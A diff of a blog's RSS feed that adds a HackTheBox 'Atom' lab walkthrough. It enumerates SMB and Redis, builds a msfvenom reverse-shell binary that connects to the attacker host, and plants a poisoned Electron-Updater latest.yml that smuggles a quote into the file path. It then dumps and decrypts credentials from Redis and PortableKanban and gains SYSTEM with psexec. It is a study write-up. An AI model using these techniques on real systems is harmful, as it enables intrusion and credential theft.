@@ -7,6 +7,344 @@
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/writeups/hackthebox/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>HackTheBox - Atom</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
+      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
+      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis.</description>
+      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Electron-Builder app through auto-update.</li>
+<li>Redis enumeration</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>CrackMapExec</li>
+<li>Netcat</li>
+<li>Impacket</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
+$ nmap -p- --max-rate <span style="color:#ae81ff">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-17 07:56 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.237
+Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65529</span> filtered ports
+Reason: <span style="color:#ae81ff">65529</span> no-responses
+PORT     STATE SERVICE      REASON          VERSION
+80/tcp   open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+135/tcp  open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+443/tcp  open  ssl/http     syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+5985/tcp open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+6379/tcp open  redis        syn-ack ttl <span style="color:#ae81ff">127</span> Redis key-value store
+Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 153.92 seconds
+</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
+<p>On Redis, authenticated is required.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
+$ nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
+<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+INFO
+-NOAUTH Authentication required.
+</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
+$ crackmapexec smb 10.10.10.237 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> x64 <span style="color:#f92672">(</span>name:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ATOM<span style="color:#ae81ff">\A</span>NONYMOUS: 
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Share           Permissions     Remark
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             -----           -----------     ------
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             ADMIN$                          Remote Admin
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             C$                              Default share
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             IPC$                            Remote IPC
+SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Software_Updates READ,WRITE      
+</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
+<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
+$ smbclient -N //10.10.10.237/Software_Updates
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
+  client1                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
+  client2                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
+  client3                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
+  UAT_Testing_Procedures.pdf          A    <span style="color:#ae81ff">35202</span>  Fri Apr  <span style="color:#ae81ff">9</span> 07:18:08 <span style="color:#ae81ff">2021</span>
+
+                <span style="color:#ae81ff">4413951</span> blocks of size 4096. <span style="color:#ae81ff">1361569</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> prompt off
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
+getting file <span style="color:#ae81ff">\U</span>AT_Testing_Procedures.pdf of size <span style="color:#ae81ff">35202</span> as UAT_Testing_Procedures.pdf <span style="color:#f92672">(</span>121.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 121.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
+<p>Port 80 and 443 are displaying the same site content. It&rsquo;s a software company site called &ldquo;Heed Solutions&rdquo;</p>
+<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
+</p>
+<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>. I&rsquo;ll download that file.</p>
+<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
+</p>
+<p>I&rsquo;ll ad the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
+<pre><code>→ root@kali «atom» «10.10.14.49» 
+$ echo '10.10.10.237 atom.htb' &gt;&gt; /etc/hosts
+</code></pre><p>Poking the website with its hostname doesn&rsquo;t show any different.</p>
+<pre><code>→ root@kali «atom» «10.10.14.49» 
+$ curl -s -k https://10.10.10.237/ | wc -c
+7581
+→ root@kali «atom» «10.10.14.49» 
+$ curl -s -k http://10.10.10.237/ | wc -c 
+7581
+→ root@kali «atom» «10.10.14.49» 
+$ curl -s -k http://atom.htb/ | wc -c
+7581
+→ root@kali «atom» «10.10.14.49» 
+$ curl -s -k https://atom.htb/ | wc -c
+7581
+</code></pre><h3 id="analysis">Analysis</h3>
+<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
+<pre><code>→ root@kali «loot» «10.10.14.49» 
+$ file heedv1_setup_1.0.0.exe 
+heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
+</code></pre><p>&ldquo;self-extracting archive&rdquo; is written in the file info above, it means it can be extracted, for example using <code>7z</code>.</p>
+<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
+<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
+$ tree
+.
+├── $PLUGINSDIR
+│   ├── app-64
+...&lt;SNIP&gt;...
+│   │   ├── natives_blob.bin
+│   │   ├── resources
+│   │   │   ├── app.asar
+│   │   │   ├── app-update.yml # ==&gt; Updater config
+│   │   │   ├── electron.asar
+│   │   │   ├── elevate.exe
+│   │   │   └── inspector
+...&lt;SNIP&gt;...
+
+73 directories, 274 files
+</code></pre><p>The file contains another hostname. I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
+$ cat ./<span style="color:#ae81ff">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
+provider: generic
+url: <span style="color:#e6db74">&#39;http://updates.atom.htb&#39;</span>
+publisherName:
+  - HackTheBox
+</code></pre></div><p>Unfortunately, it is the same site.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
+$ curl -s http://updates.atom.htb/ | wc -c
+<span style="color:#ae81ff">7581</span>
+</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
+<ul>
+<li>The app is packed with electron-builder</li>
+<li>There&rsquo;s no server interaction when creating notes</li>
+</ul>
+<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
+</p>
+<p>According to the image above, the <code>client</code> folder probably refers to the ones on SMB, and probably there is an automation to install the update.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-jason">Shell as Jason</h3>
+<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
+<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
+<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
+<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
+...&lt;SNIP&gt;...
+</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
+<blockquote>
+<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
+</blockquote>
+<p>The following is an example of malicious <code>latest.yml</code> (contains the app update definition) will pop a calculator.</p>
+<pre><code>version: 2.0.0
+path: u';calc;'pdate.exe
+sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
+releaseDate: '2021-01-24T13:44:59.064Z'
+</code></pre><p>And if a single quote <code>'</code> is added to <code>path</code>, it breaks the verification, which is simplified as follows:</p>
+<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
+</code></pre><p>But, by recalculating the hash of <code>u'pdate.exe</code>, an attacker could bypass the signature verification and  <code>u'pdate.exe</code>  would be executed as well.</p>
+<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
+<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote, but I&rsquo;ll go with remote.</p>
+<p>First, I&rsquo;ll generate a reverse shell binary using <code>msfvenom</code>, and I&rsquo;ll host the binary with Python web server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.49 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span> -f exe -o i<span style="color:#ae81ff">\&#39;</span>amf.exe
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">460</span> bytes
+Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
+Saved as: i<span style="color:#960050;background-color:#1e0010">&#39;</span>amf.exe
+</code></pre></div><p>I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ shasum -a <span style="color:#ae81ff">512</span> i<span style="color:#ae81ff">\&#39;</span>amf.exe | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | xxd -r -p | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>
+Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span style="color:#f92672">==</span>
+</code></pre></div><p>The next part is creating an update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
+<pre><code>version: 2.0.1
+path: http://10.10.14.83/i'amf.exe
+sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
+releaseDate: '2021-01-24T13:44:59.064Z'
+</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connects to my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
+$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
+putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
+listening on [any] 53 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
+Microsoft Windows [Version 10.0.19042.906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;whoami
+whoami
+atom\jason
+
+C:\WINDOWS\system32&gt;
+</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
+</p>
+<p>User flag is done here.</p>
+<pre><code>C:\Users\jason\Desktop&gt;type user.txt
+type user.txt
+b77e754354e186f...&lt;SNIP&gt;...
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-system">Shell as SYSTEM</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
+[+] Checking Credential manager
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+
+
+     Username:              ATOM\jason
+     Password:               kidvscat_electron_@123
+     Target:                ATOM\jason
+     PersistenceType:       Enterprise
+     LastWriteTime:         3/31/2021 2:53:49 AM
+</code></pre></div><p>On Jason&rsquo;s Download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. The <code>portablekanban.cfg</code> contains Redis DSN.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
+type PortableKanban\PortableKanban.cfg
+{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
+...&lt;SNIP&gt;...
+</code></pre></div><p>I&rsquo;ll note the value of <code>DbEncPassword</code></p>
+<ul>
+<li>&ldquo;DbEncPassword&rdquo;:&ldquo;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&rdquo;.</li>
+</ul>
+<h4 id="redis-revisit">Redis Revisit</h4>
+<p>Looking into the Redis installation folder, I find a password in <code>redis.windows.conf</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
+type redis.windows.conf | findstr requirepass
+requirepass kidvscat_yes_kidvscat
+</code></pre></div><p>The same password also found in <code>redis.windows-service.conf</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
+type redis.windows-service.conf | findstr requirepass
+requirepass kidvscat_yes_kidvscat
+</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> can be used to authenticate myself in Redis on port 6379.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
+$ rlwrap nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
+<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>redis<span style="color:#f92672">)</span> open
+AUTH jason kidvscat_electron_@123
+-ERR wrong number of arguments <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;auth&#39;</span> command
+AUTH kidvscat_electron_@123
+-ERR invalid password
+AUTH kidvscat_yes_kidvscat
++OK
+</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use. After sending the <code>INFO</code> command,  I&rsquo;ll look for a chunk called <code>Keyspace</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INFO
+$1938
+# Server
+redis_version:3.0.504
+...&lt;SNIP&gt;...
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+</code></pre></div><p>There is one database active, which is<code>db0</code> and it contains 4 keys. I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">SELECT 0
++OK
+KEYS *
+*4
+$48
+pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+$11
+pk:ids:User
+$20
+pk:ids:MetaDataClass
+$57
+pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
+</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">GET</span> <span style="color:#960050;background-color:#1e0010">pk:urn:user:e</span><span style="color:#ae81ff">8e29158</span><span style="color:#960050;background-color:#1e0010">-d</span><span style="color:#ae81ff">70</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">-44</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">-a</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">ba</span><span style="color:#ae81ff">-4949</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">52790</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">0</span>
+<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">207</span>
+{<span style="color:#f92672">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,<span style="color:#f92672">&#34;Name&#34;</span>:<span style="color:#e6db74">&#34;Administrator&#34;</span>,<span style="color:#f92672">&#34;Initials&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;Email&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;EncryptedPassword&#34;</span>:<span style="color:#e6db74">&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;</span>,<span style="color:#f92672">&#34;Role&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,<span style="color:#f92672">&#34;Inactive&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;TimeStamp&#34;</span>:<span style="color:#ae81ff">637530169606440253</span>}
+</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
+<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (modified version of the original exploit).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">from base64 import b64decode
+import sys
+import des 
+
+key <span style="color:#f92672">=</span> des.DesKey<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;7ly6UznJ&#39;</span><span style="color:#f92672">)</span>
+iv <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;XuVUm5fR&#39;</span>
+
+try:    
+	passwd <span style="color:#f92672">=</span> b64decode<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.encode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
+except IndexError:
+	print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>
+    
+	sys.exit<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>
+
+dec_password <span style="color:#f92672">=</span> key.decrypt<span style="color:#f92672">(</span>passwd, initial<span style="color:#f92672">=</span>iv, padding<span style="color:#f92672">=</span>True<span style="color:#f92672">)</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
+</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
+<pre><code>→ kali@kali «atom» «10.10.14.83»
+$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
+[+] Decrypted Password: kidvscat_admin_@123
+</code></pre><h4 id="psexecpy">psexec.py</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
+$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.237.....
+[*] Found writable share ADMIN$
+[*] Uploading file FCSITnEj.exe
+[*] Opening SVCManager on 10.10.10.237.....
+[*] Creating service DCLl on 10.10.10.237.....
+[*] Starting service DCLl.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19042.906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
+nt authority\system
+ATOM
+
+C:\WINDOWS\system32&gt;ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
+   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
+   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
+   IPv4 Address. . . . . . . . . . . : 10.10.10.237
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
+                                       10.10.10.2
+</code></pre></div><h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
+<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>HackTheBox - Spectra</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
       <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
@@ -1751,328 +2089,6 @@ sonny@CEREAL C:\Users\sonny&gt;dir desktop\
 <li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
 <li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
 <li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Delivery</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</link>
-      <pubDate>Tue, 25 May 2021 05:36:18 +0700</pubDate>
-      
